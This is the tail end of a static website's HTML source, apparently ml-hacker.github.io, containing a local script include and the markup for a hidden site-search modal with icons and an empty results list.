<script src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" type="text/javascript"></script>
</footer>
<div class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url="https://ml-hacker.github.io/" id="search-wrapper">
<div class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800" id="search-modal">
<header class="relative z-10 flex items-center justify-between flex-none px-2">
<form class="flex items-center flex-auto min-w-0">
<div class="flex items-center justify-center w-8 h-8 text-neutral-400">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</div>
<input class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" id="search-query" placeholder="Search" tabindex="0" type="search"/>
</form>
<button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" id="close-search-button" title="Close (Esc)">
<span class="relative block icon"><svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</button>
</header>
<section class="flex-auto px-2 overflow-auto">
<ul id="search-results">
</ul>
</section>
</div>
</div>
</div>
</body>
</html>
